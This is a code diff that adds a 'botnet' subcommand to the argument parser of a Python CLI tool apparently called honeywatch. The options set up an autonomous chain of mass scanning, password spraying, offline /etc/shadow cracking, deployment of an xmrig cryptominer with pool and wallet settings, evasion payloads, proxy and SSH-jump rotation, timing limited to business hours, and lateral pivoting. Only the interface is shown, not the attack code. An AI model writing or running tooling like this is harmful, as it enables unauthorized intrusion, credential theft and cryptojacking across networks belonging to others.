@@ -21,6 +21,7 @@ import time
 from collections import Counter
 
 from honeywatch.cmd_spray import _cmd_spray
+from honeywatch.cmd_botnet import _cmd_botnet
 
 __all__ = ["build_parser", "main"]
 
@@ -650,6 +651,45 @@ def build_parser() -> argparse.ArgumentParser:
     p_spray.add_argument("--skip-vpn-check", action="store_true", help="bypass the Mullvad VPN gate")
     p_spray.add_argument("--config", default=None, help="path to a honeywatch TOML config")
     p_spray.set_defaults(func=_cmd_spray)
+
+    # ----------------------------- botnet -------------------------------
+    p_net = sub.add_parser(
+        "botnet",
+        help="run the autonomous scan->spray->crack->deploy->pivot chain",
+    )
+    p_net.add_argument("targets", nargs="*", metavar="TARGET", help="CIDRs/IPs for the recon phase")
+    p_net.add_argument("--scan-tool", choices=("masscan", "zmap"), default="masscan")
+    p_net.add_argument("--scan-rate", type=int, default=None)
+    p_net.add_argument("--max-hosts", type=int, default=None)
+    p_net.add_argument("--users", default=None, help="comma-separated usernames to spray")
+    p_net.add_argument("--user-file", default=None, help="username list file")
+    p_net.add_argument("--passwords", default=None, help="comma-separated passwords to spray")
+    p_net.add_argument("--password-file", default=None, help="password list file")
+    p_net.add_argument("--payload", default="xmrig", help="payload to deploy (default xmrig)")
+    p_net.add_argument("--pool", default=None, help="mining pool URL")
+    p_net.add_argument("--wallet", default=None, help="wallet address")
+    p_net.add_argument("--worker", default=None, help="worker name")
+    p_net.add_argument("--threads", type=int, default=0)
+    p_net.add_argument("--tls", action="store_true")
+    p_net.add_argument("--evasion", default=None, help="comma-separated evasion payload ids")
+    p_net.add_argument("--hashcrack-wordlist", default=None, help="wordlist for offline /etc/shadow cracking")
+    p_net.add_argument("--hashcrack-tool", choices=("hashcat", "john"), default="hashcat")
+    p_net.add_argument("--business-hours", action="store_true", help="only act inside 08:00-18:00 local")
+    p_net.add_argument("--proxy-file", default=None, help="socks5:// pool to round-robin")
+    p_net.add_argument("--jump-file", default=None, help="user@host SSH jumps to round-robin")
+    p_net.add_argument("--delay", type=float, default=0.0)
+    p_net.add_argument("--jitter", type=float, default=0.5)
+    p_net.add_argument("--lockout-delay", type=float, default=0.0)
+    p_net.add_argument("--host-concurrency", type=int, default=8)
+    p_net.add_argument("--min-confidence", type=float, default=0.7)
+    p_net.add_argument("--max-rounds", type=int, default=3, help="pivot loops (default 3)")
+    p_net.add_argument("--shadow-stash", default=".honeywatch/shadow_stash")
+    p_net.add_argument("--config", default=None,
+                       help="config TOML path; recon honors its scan tuning (ports, AI, scanner opts)")
+    p_net.add_argument("--db", default=None, help="SQLite database path")
+    p_net.add_argument("--skip-vpn-check", action="store_true")
+    p_net.add_argument("--json", action="store_true")
+    p_net.set_defaults(func=_cmd_botnet)
 
     return parser
 
